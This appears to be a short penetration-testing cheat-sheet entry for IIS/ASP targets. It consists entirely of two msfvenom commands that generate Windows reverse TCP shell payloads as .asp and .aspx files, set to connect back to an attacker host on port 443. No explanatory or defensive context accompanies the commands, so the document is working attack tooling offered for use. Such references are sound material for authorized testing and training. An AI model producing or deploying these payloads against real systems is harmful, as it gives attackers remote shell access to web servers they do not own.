# IIS / ASP

```text
msfvenom -p windows/shell_reverse_tcp LHOST=$ATTACKER LPORT=443 -f asp -o shell.asp
```

```text
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=443 -f aspx -o shell.aspx
```

